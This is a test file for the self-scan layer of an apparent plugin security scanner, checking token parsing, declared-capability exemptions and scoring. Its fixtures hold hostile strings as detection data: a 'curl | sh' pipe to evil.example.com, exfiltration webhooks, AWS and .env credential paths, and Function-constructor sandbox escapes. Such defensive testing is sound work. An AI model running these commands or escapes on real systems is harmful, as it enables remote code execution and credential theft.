import { describe, expect, it } from 'vitest'
import {
  parseTokens, isDeclared, annotateSelfScan, isDetectionDataFile,
  computeSelfScore, computeSelfVerdict,
} from '../lib/report/self-scan.js'
import type { Finding, Severity, Confidence } from '../lib/scanner/protocol.js'

function F(p: {
  rule: string; severity: Severity; message: string; evidence: string;
  confidence?: Confidence; file?: string; line?: number
}): Finding {
  return {
    rule: p.rule, severity: p.severity, message: p.message, evidence: p.evidence,
    confidence: p.confidence ?? 'certain',
    ...(p.file !== undefined ? { file: p.file } : {}),
    ...(p.line !== undefined ? { line: p.line } : {}),
  }
}

describe('parseTokens', () => {
  it('声明模块：识别 child_process 且无其它危险 token', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: '进程访问', evidence: 'child_process', file: 'src/guard/runtime-guard.ts' }))
    expect(t.modules).toContain('child_process')
    expect(t.hosts).toHaveLength(0)
    expect(t.env).toHaveLength(0)
  })
  it('未声明 env：process.env.DEEPSEEK_API_KEY 被提出', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: 'env', evidence: 'process.env.DEEPSEEK_API_KEY', file: 'a.ts' }))
    expect(t.env).toEqual(['DEEPSEEK_API_KEY'])
  })
  it('已声明 env 不产生 token', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'high', message: 'env', evidence: 'process.env.DSH_PLUGIN_VET_CACHE_DIR', file: 'a.ts' }))
    expect(t.env).toHaveLength(0)
  })
  it('出站 URL：webhook.site 命中', () => {
    const t = parseTokens(F({ rule: 'R13', severity: 'critical', message: '外传', evidence: 'https://webhook.site/collect', file: 'a.ts' }))
    expect(t.hosts).toContain('webhook.site')
  })
  it('回环 IP 不产生 host token', () => {
    const t = parseTokens(F({ rule: 'R15', severity: 'info', message: '网络目标', evidence: 'http://127.0.0.1:8787/x', file: 'a.ts' }))
    expect(t.hosts).toHaveLength(0)
    // 0.5.15：这里只断言 token 解析（回环不算外联目标）。**不**再顺带断言 isDeclared——
    // 该条 finding 五类 token 全空，新版一律保留（空 token 不构成"已声明"的证据），
    // 把两件事混在一条断言里会让人以为「无 token ⇒ 已声明」是契约的一部分。
  })
  it('osv.dev 为声明目标', () => {
    const t = parseTokens(F({ rule: 'OSV', severity: 'high', message: '查询', evidence: 'https://osv.dev/v1/query', file: 'package.json' }))
    expect(t.hosts).toHaveLength(0)
  })
  it('裸 process.env 引用不误判为 .env 凭据文件', () => {
    const f = F({ rule: 'R3', severity: 'info', message: '只读 process 成员（能力触达面）：process.env', evidence: '', file: 'profile-boot.ts', confidence: 'likely' })
    const t = parseTokens(f)
    expect(t.fs).toHaveLength(0)
    expect(t.env).toHaveLength(0)
    // 同上：解析结论到此为止。`process.env` 裸引用不产生 env token 是对的；它是否算
    // 「已声明」是另一条规则（0.5.15 起：无 token → 保留）。
  })
  it('真实 .env 文件路径仍命中', () => {
    const t = parseTokens(F({ rule: 'R11', severity: 'high', message: '敏感文件', evidence: 'path/to/.env.production', file: 'a.ts' }))
    expect(t.fs).toContain('.env')
  })
  it('凭据路径段：.aws 命中', () => {
    const t = parseTokens(F({ rule: 'R11', severity: 'high', message: '敏感', evidence: '~/.aws/credentials', file: 'a.ts' }))
    expect(t.fs).toContain('.aws')
  })
  it('shell 管道：curl | sh 命中', () => {
    const t = parseTokens(F({ rule: 'R9', severity: 'critical', message: '表层 shell', evidence: 'curl -s https://evil.example.com | sh', file: 'a.ts' }))
    expect(t.spawn).toContain('shell-pipe')
  })
  it('IPC 禁区：worker_threads 命中', () => {
    const t = parseTokens(F({ rule: 'R3', severity: 'critical', message: '线程', evidence: "require('worker_threads')", file: 'a.ts' }))
    expect(t.modules).toContain('worker_threads')
  })
})

describe('annotateSelfScan', () => {
  /**
   * 0.5.15 回归：**空 token 不得被算成「已声明」**。
   *
   * 0.5.14 及以前 `isDeclared` 在五类 token 全空时 `return true`，于是「一个能说清自己
   * 碰到什么能力的 token 都没有」被判成「声明完整、可以降级」。这是自审信任链上最脆的
   * 一格：一份**根本没被解析出能力面**的逃逸，反而最难被 retained 拦住。
   *
   * 实测过的两个具体形态（两条 critical）在旧版被判 declared、verdict=clean。现在它们必须
   * 留在 retained 里，并把 verdict 拉到 critical。
   */
  it('空 token 的 critical 逃逸不得被算成已声明（0.5.15）', () => {
    const escapes = [
      F({ rule: 'R1', severity: 'critical', message: '构造器链逃逸', evidence: 'agent.constructor("return process")()', file: 'a.js', confidence: 'certain' }),
      F({ rule: 'R2', severity: 'critical', message: '动态构造', evidence: 'new Function("return process")()', file: 'b.js', confidence: 'certain' }),
    ]
    // 前提：这两条的 token 确实是空的（否则这条用例测的就不是它声称的东西）
    for (const f of escapes) {
      const t = parseTokens(f)
      expect([t.modules.length, t.env.length, t.hosts.length, t.fs.length, t.spawn.length]).toEqual([0, 0, 0, 0, 0])
      expect(isDeclared(f, t)).toBe(false)
    }
    const info = annotateSelfScan(escapes, { pin: 'pinned-match' })
    expect(info.annotation.declared).toBe(0)
    expect(info.annotation.retained).toHaveLength(2)
    expect(info.verdict).toBe('critical')
  })

  it('禁区模块不得被降级（worker_threads / vm 恒保留）', () => {
    const f = F({ rule: 'R3', severity: 'critical', message: 'IPC 原语', evidence: 'require("worker_threads")', file: 'a.js', confidence: 'certain' })
    expect(isDeclared(f, parseTokens(f))).toBe(false)
  })

  it('pinned：已声明模块 finding → declared、verdict clean、score 100', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'critical', message: '进程访问', evidence: 'child_process', file: 'src/guard/runtime-guard.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.declared).toBe(1)
    expect(info.annotation.retained).toHaveLength(0)
    expect(info.verdict).toBe('clean')
    expect(info.staticScore).toBe(100)
  })
  it('pinned 也保留未声明 env（有界豁免）', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'critical', message: 'env', evidence: 'process.env.DEEPSEEK_API_KEY', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.annotation.retained[0].severity).toBe('critical')
    expect(info.verdict).toBe('critical')
  })
  it('pinned 也保留出站外传 host（核心边界）', () => {
    const info = annotateSelfScan([
      F({ rule: 'R13', severity: 'critical', message: '外传', evidence: 'https://webhook.site/x', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.annotation.retained[0].severity).toBe('critical')
    expect(info.verdict).toBe('critical')
  })
  it('数据集自引用：仅 pinned-match 豁免文件级', () => {
    const f = F({ rule: 'R14', severity: 'critical', message: '规则数据', evidence: 'curl | sh', file: 'scanner-bin/rules/non-js-scripts.ts', confidence: 'certain' })
    const pinned = annotateSelfScan([f], { pin: 'pinned-match' })
    expect(pinned.annotation.datasetSelfRef).toBe(1)
    expect(pinned.annotation.retained).toHaveLength(0)
    const dev = annotateSelfScan([f], { pin: 'dev-tree' })
    expect(dev.annotation.datasetSelfRef).toBe(0)
    expect(dev.annotation.retained).toHaveLength(1) // shell-pipe 不豁免
    expect(dev.verdict).toBe('critical')
  })
  it('verdict 只由 retained 的 decisive 决定', () => {
    const info = annotateSelfScan([
      F({ rule: 'R3', severity: 'high', message: '进程', evidence: 'child_process', file: 'a.ts', confidence: 'certain' }),
      F({ rule: 'R3', severity: 'high', message: '未知 env', evidence: 'process.env.SECRET_TOKEN', file: 'a.ts', confidence: 'certain' }),
    ], { pin: 'pinned-match' })
    expect(info.annotation.declared).toBe(1)
    expect(info.annotation.retained).toHaveLength(1)
    expect(info.verdict).toBe('suspicious') // 1×high×certain → 扣 20
    expect(info.staticScore).toBe(80)
  })
  it('开发夹具（test/spec）：仅 pinned-match 豁免', () => {
    const f = F({ rule: 'R13', severity: 'high', message: '外传端点', evidence: 'https://discord.com/api/webhooks/xxx', file: 'test/r13-r14.test.ts', confidence: 'certain' })
    const pinned = annotateSelfScan([f], { pin: 'pinned-match' })
    expect(pinned.annotation.devFixtures).toBe(1)
    expect(pinned.annotation.retained).toHaveLength(0)
    expect(pinned.verdict).toBe('clean')
    const dev = annotateSelfScan([f], { pin: 'dev-tree' })
    expect(dev.annotation.devFixtures).toBe(0)
    expect(dev.annotation.retained).toHaveLength(1)
    expect(dev.verdict).toBe('suspicious')
  })
  it('元信息透传：version / pin / isTrustLayer', () => {
    const info = annotateSelfScan([], { pin: 'pinned-match', version: '0.1.21', isTrustLayer: true })
    expect(info.isTrustLayer).toBe(true)
    expect(info.version).toBe('0.1.21')
    expect(info.pin).toBe('pinned-match')
  })
  it('isDetectionDataFile 按 basename 判', () => {
    expect(isDetectionDataFile('scanner-bin/rules/non-js-scripts.ts')).toBe(true)
    expect(isDetectionDataFile('src/guard/honeypot.ts')).toBe(true)
    expect(isDetectionDataFile('src/client/i18n.ts')).toBe(true)
    expect(isDetectionDataFile('src/guard/runtime-guard.ts')).toBe(false)
    expect(isDetectionDataFile(undefined)).toBe(false)
  })
})

describe('computeSelfScore（与 scanner-bin/score.ts 镜像）', () => {
  it('2 × critical certain → 10', () => {
    expect(computeSelfScore([
      F({ rule: 'R1', severity: 'critical', message: 'a', evidence: 'a' }),
      F({ rule: 'R1', severity: 'critical', message: 'b', evidence: 'b' }),
    ])).toBe(10)
  })
  it('纯 info/heuristic → clean 100', () => {
    const findings = [F({ rule: 'R8', severity: 'info', message: 'skip', evidence: '', confidence: 'heuristic' })]
    expect(computeSelfVerdict(findings)).toBe('clean')
    expect(computeSelfScore(findings)).toBe(100)
  })
  it('未知 severity（协议漂移/伪造报告）不 NaN 整分（round-21 与 score.ts ?? 0 对齐）', () => {
    const poisoned = [
      F({ rule: 'R1', severity: 'critical', message: 'a', evidence: 'a' }),
      { ...F({ rule: 'RX', severity: 'info', message: 'x', evidence: '' }), severity: 'apocalypse' } as unknown as Finding,
    ]
    const s = computeSelfScore(poisoned)
    expect(Number.isFinite(s)).toBe(true)
    expect(s).toBe(55) // critical certain 45 → 55；未知按 0 计分但不再摧毁形状
  })
})
